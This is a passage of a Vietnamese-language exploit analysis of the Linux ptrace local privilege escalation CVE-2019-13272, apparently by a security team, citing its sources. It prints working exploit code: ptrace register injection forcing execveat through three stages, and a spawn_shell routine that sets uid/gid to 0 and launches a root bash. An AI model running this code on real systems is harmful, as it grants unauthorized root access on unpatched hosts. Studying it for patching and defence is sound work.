126     unsigned long argv[2];
127     unsigned long envv[1];
128     char arg0[8];
129     char path[1];
130   } ipage = {
131     .argv = { scratch_area + offsetof(struct injected_page, arg0) }
132   };
133   strcpy(ipage.arg0, arg0);
134   for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {
135     unsigned long pdata = ((unsigned long *)&ipage)[i];
136     SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
137                 (void*)pdata));
138   }
139 
140   /* execveat(exec_fd, path, argv, envv, flags) */
141   regs.orig_rax = __NR_execveat;
142   regs.rdi = exec_fd;
143   regs.rsi = scratch_area + offsetof(struct injected_page, path);
144   regs.rdx = scratch_area + offsetof(struct injected_page, argv);
145   regs.r10 = scratch_area + offsetof(struct injected_page, envv);
146   regs.r8 = AT_EMPTY_PATH;
147 
148   SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
149   SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
150   SAFE(waitpid(pid, &dummy_status, 0));
151 }
```

Chức năng của force_exec_and_wait là dùng ptrace để điều khiển tracee thực hiện hàm execveat để thay thế image của process, ở đây nó điều khiển task B thực hiện process của task A (tức là chương trình thực thi của exploit - file binary exploit) với tham số là stage2 để task B thực thi hàm middle_stage2
``` c
167 int main(int argc, char **argv) {
168   if (strcmp(argv[0], "stage2") == 0)
169     return middle_stage2();
170   if (strcmp(argv[0], "stage3") == 0)
171     return spawn_shell();
```

Hàm middle_stage2 cũng gọi force_exec_and_wait, sẽ làm cho task B sử dụng ptrace để điều khiển task C thực hiện hàm execveat, thay thế image của task C bằng tệp nhị phân của exploit và tham số là stage3
``` c
153 static int middle_stage2(void) {
154   /* our child is hanging in signal delivery from execve()'s SIGTRAP */
155   pid_t child = SAFE(waitpid(-1, &dummy_status, 0));
156   force_exec_and_wait(child, 42, "stage3");
157   return 0;
158 }
```

Khi tệp exploit binary được chạy với tham số stage3, nó sẽ chạy hàm spawn_shell, vì vậy giai đoạn cuối cùng của task C là chạy spawn_shell.
``` c
160 static int spawn_shell(void) {
161   SAFE(setresgid(0, 0, 0));
162   SAFE(setresuid(0, 0, 0));
163   execlp("bash", "bash", NULL);
164   err(1, "execlp");
165 }
```

Trong hàm spawn_shell, trước tiên nó sử dụng setresgid/setresuid để thay đổi real uid/effective uid/save uid của process thành root. Vì task C vừa thực hiện suid binary và thay đổi euid của chính nó thành root, vì vậy ở đây setresuid/setresgid có thể được thực thi thành công. Lúc này, task C đã trở thành một root process hoàn chỉnh. Cuối cùng, thực thi execlp để mở một shell, và shell này sẽ có đầy đủ các đặc quyền của root.

``` go
       	     forks               forks
+------proc_A -----------> proc_B ------------> proc_C
|       |                   |                    |
|     Wait B                |                    |
|     And attach            |                    |
|     Execve stage 2 in B   |                    |
+-------+-------------------+--------------------+
stage 1 |                 pkexec              get privileged tracer
|       |                   |                    |
|       |                   |                    |
|       |                 Unprivileged        exec SUID binary,
|       |                 Traced by A         become privileged, SIGTRAPed
+-------+-------------------+--------------------+
|       |                   |                    |
stage 2 |                 Wait C,                |
|       |                 Execve stage3 in C     |
|       |                   |                    |
+-------+-------------------+--------------------+
|       |                   |                    |
|       |                   |                    |
stage 3 |                   |                 setresuid to 0, 0, 0
|       |                   |                    |
|       |                   |                 exeve bash as root :)
+-------+-------------------+--------------------+
```

## Trích dẫn
[https://www.anquanke.com/post/id/193863#h2-3](https://www.anquanke.com/post/id/193863#h2-3)
[https://jm33.me/cve-2019-13272-linux-lpe-via-ptrace_traceme.html](https://jm33.me/cve-2019-13272-linux-lpe-via-ptrace_traceme.html)

<p align="right">
<b><i>DatntSec. Viettel Cyber Security.<i><b>
</p>
